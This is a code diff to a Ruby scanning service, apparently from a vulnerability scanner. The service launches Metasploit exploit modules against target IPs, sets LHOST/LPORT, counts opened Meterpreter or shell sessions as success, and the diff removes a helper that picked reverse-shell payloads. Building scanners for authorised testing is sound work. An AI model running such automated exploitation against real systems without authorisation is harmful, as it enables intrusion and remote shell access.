@@ -7,6 +7,7 @@ require 'net/smtp'
 require 'thread'
 require 'set'
 require 'shellwords'
+require 'pty'
 require 'msfrpc-client'
 
 class ScanService
@@ -107,7 +108,7 @@ class ScanService
                 if result[:success]
                   target_findings += 1
                   succeeded_exploit_ids << exploit_record.id
-                  create_finding(asset_id, exploit_record.id, severity, result[:evidence])
+                  create_finding(asset_id, exploit_record.id, severity, result[:evidence], port)
                 end
 
                 mutex.synchronize do
@@ -447,9 +448,12 @@ class ScanService
       end
 
       output = output.sub('===AEGIS_DONE===', '').rstrip
-      success  = output.match?(/\[\+\]/i)
-      evidence = output.scan(/\[\+\].+/).map(&:strip).join("\n").first(500)
-      puts success ? "[+] #{mod_name} detected something on #{target_ip}" : "[-] #{mod_name} — nothing detected"
+      ip_pat  = Regexp.escape(target_ip)
+      meaningful_ip_lines = output.scan(/\[\*\] #{ip_pat}.+/i)
+                                  .reject { |l| l.match?(/Scanned \d+ of \d+ hosts/i) }
+      success  = output.match?(/\[\+\]/i) || meaningful_ip_lines.any?
+      evidence = (output.scan(/\[\+\].+/i) + meaningful_ip_lines).map(&:strip).join("\n").first(500)
+      puts success ? "[+] #{mod_name} detected on #{target_ip}" : "[-] #{mod_name} — nothing detected on #{target_ip}"
       { success: success, evidence: evidence.presence }
     ensure
       client.call('console.destroy', own_cid) rescue nil if own_cid
@@ -461,43 +465,64 @@ class ScanService
   end
 
   # Fallback used when msfrpcd is unavailable (MSF_RPC_PASS not set or connection refused).
+  # Uses PTY.spawn so msfconsole sees a terminal and outputs [+] / [*] lines in full.
   def attack_subprocess(exploit, target_ip, port, proxy, timeout_secs)
-    rc_file  = Tempfile.new(['aegis_', '.rc'])
-    log_file = Tempfile.new(['aegis_out_', '.txt'])
+    rc_file = Tempfile.new(['aegis_', '.rc'])
+    output  = ''
+    pid     = nil
 
     begin
       rc_file.write(build_resource_file(exploit, target_ip, port, proxy))
       rc_file.flush
 
       puts "Launching msfconsole for #{target_ip}:#{port} [#{exploit['name']}]#{proxy ? " via #{proxy}" : " (direct)"}"
-      pid = Process.spawn(
-        'msfconsole', '-q', '--no-readline', '-r', rc_file.path,
-        [:out, :err] => log_file.path
-      )
+
+      master, slave, pid = PTY.spawn('msfconsole', '-q', '--no-readline', '-r', rc_file.path)
+      slave.close rescue nil  # parent doesn't need the slave end
 
       begin
-        Timeout.timeout(timeout_secs + 10) { Process.wait(pid) }
+        Timeout.timeout(timeout_secs + 10) do
+          begin
+            loop { output += master.readpartial(4096) }
+          rescue Errno::EIO, EOFError
+            # PTY slave closed — process finished
+          end
+        end
       rescue Timeout::Error
         Process.kill('TERM', pid) rescue nil
+      ensure
         Process.wait(pid) rescue nil
+        master.close rescue nil
       end
 
-      output  = File.read(log_file.path)
+      # Strip ANSI colour codes produced by msfconsole in TTY mode
+      clean  = output.gsub(/\e\[[\d;]*[A-Za-z]/, '').gsub(/\r\n?/, "\n")
+      ip_pat = Regexp.escape(target_ip)
+
+      # For safe mode: [+] lines are explicit hits; [*] ip:port lines with actual content
+      # (not the generic "Scanned X of Y hosts" completion line) count as informational detections.
+      meaningful_ip_lines = clean.scan(/\[\*\] #{ip_pat}.+/i)
+                                 .reject { |l| l.match?(/Scanned \d+ of \d+ hosts/i) }
+
       success = if @scan_options[:safe_mode]
-        output.match?(/\[\+\]/i)
+        clean.match?(/\[\+\]/i) || meaningful_ip_lines.any?
       else
-        output.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
+        clean.match?(/session \d+ opened|Meterpreter session|Command shell session/i)
       end
-      evidence_lines = output.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
+
+      evidence_lines = if @scan_options[:safe_mode]
+        (clean.scan(/\[\+\].*/i) + meaningful_ip_lines).join("\n")
+      else
+        clean.scan(/\[\+\].*|.*session \d+ opened.*/i).join("\n")
+      end
       evidence = evidence_lines.length > 500 ? evidence_lines[0, 500] : evidence_lines
-      { success: success, evidence: evidence.presence || (success ? 'Session established' : nil) }
+      { success: success, evidence: evidence.presence || (success ? 'Detected' : nil) }
+    rescue => e
+      puts "Attack failed: #{e.message}"
+      { success: false, evidence: nil }
     ensure
-      rc_file.close!   rescue nil
-      log_file.close!  rescue nil
+      rc_file.close! rescue nil
     end
-  rescue => e
-    puts "Attack failed: #{e.message}"
-    { success: false, evidence: nil }
   end
 
   def build_resource_file(exploit, target_ip, port, proxy)
@@ -508,16 +533,15 @@ class ScanService
   def build_exploit_rc(exploit, target_ip, port, proxy)
     lhost   = outbound_ip_for(target_ip)
     lport   = ENV.fetch('MSF_LPORT', '4444')
-    payload = exploit['default_payload'].presence || default_payload_for(exploit)
+    payload = exploit['default_payload'].presence
 
     lines = [
       "use #{exploit['metasploit_module']}",
       "set RHOSTS #{target_ip}",
       (port ? "set RPORT #{port}" : nil),
-      "set PAYLOAD #{payload}",
+      (payload ? "set PAYLOAD #{payload}" : nil),
       "set LHOST #{lhost}",
       "set LPORT #{lport}",
-      "set ExitOnSession false",
       "set ConnectTimeout 15",
       (proxy ? "set Proxies #{proxy}" : nil),
       "run -z",
@@ -539,15 +563,6 @@ class ScanService
       "exit -y"
     ].compact
     lines.join("\n") + "\n"
-  end
-
-  def default_payload_for(exploit)
-    mod = exploit['metasploit_module'].to_s
-    if    mod.include?('windows') then 'windows/x64/shell/reverse_tcp'
-    elsif mod.include?('osx')     then 'osx/x64/shell_reverse_tcp'
-    elsif mod.include?('apple')   then 'osx/x64/shell_reverse_tcp'
-    else  'linux/x86/shell/reverse_tcp'
-    end
   end
 
   def create_scan_target(asset_id)
@@ -587,13 +602,14 @@ class ScanService
     puts "Error creating scan_exploit: #{e.message}"
   end
 
-  def create_finding(asset_id, exploit_id, severity, evidence)
+  def create_finding(asset_id, exploit_id, severity, evidence, port = nil)
     return unless @scan&.id && asset_id && exploit_id
     safe_severity = %w[critical high medium low].include?(severity&.downcase) ? severity.downcase : 'medium'
     safe_evidence = ActiveRecord::Base.connection.quote(evidence.to_s)
+    port_sql      = port ? port.to_i : 'NULL'
     ActiveRecord::Base.connection.execute(
-      "INSERT INTO vuln_scanner.findings (scan_id, asset_id, exploit_id, severity, status, evidence, discovered_at) " \
-      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_severity}', 'open', #{safe_evidence}, NOW())"
+      "INSERT INTO vuln_scanner.findings (scan_id, asset_id, exploit_id, severity, status, evidence, port, discovered_at) " \
+      "VALUES (#{@scan.id.to_i}, #{asset_id.to_i}, #{exploit_id.to_i}, '#{safe_severity}', 'open', #{safe_evidence}, #{port_sql}, NOW())"
     )
   rescue => e
     puts "Error creating finding: #{e.message}"
